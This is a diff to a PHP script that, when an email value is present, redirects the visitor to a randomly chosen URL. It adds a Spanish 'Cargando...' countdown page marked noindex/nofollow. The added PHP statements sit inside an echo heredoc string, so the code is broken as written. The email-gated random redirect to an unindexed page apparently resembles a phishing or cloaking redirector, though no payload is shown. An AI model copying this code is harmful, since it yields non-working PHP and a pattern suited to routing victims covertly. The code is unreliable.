@@ -141,10 +141,63 @@ if (!empty($email)) {
 $randomUrl = $urls[array_rand($urls)];
 header("Location: " . $randomUrl, true, 302);
 echo <<<HTML
+$waitSeconds = 2;
+?>
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
+<html lang="es-419">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>Cargando...</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+    height: 100%;
+    background: #fff;
+    font-family: sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.progress-wrap {
+    width: 260px;
+    background: #ede9e3;
+    border-radius: 1px;
+    height: 1px;
+    overflow: hidden;
+}
+
+.progress-bar {
+    height: 100%;
+    width: 0%;
+    background: #1a4a7a;
+    border-radius: 1px;
+    transition: width linear;
+}
+
+.counter {
+    font-size: .85rem;
+    color: #6b6560;
+}
+
+.counter strong {
+    color: #1a4a7a;
+    font-weight: 600;
+}
+</style>
+</head>
 <body>
+
+<div class="progress-wrap">
+    <div class="progress-bar" id="pbar"></div>
+</div>
+<p class="counter">Redireccionando en <strong id="cnt"><?php echo $waitSeconds; ?></strong> segundo<?php echo $waitSeconds !== 1 ? 's' : ''; ?>…</p>
 <script>
   setTimeout(function() {
     window.location.replace("{$randomUrl}");
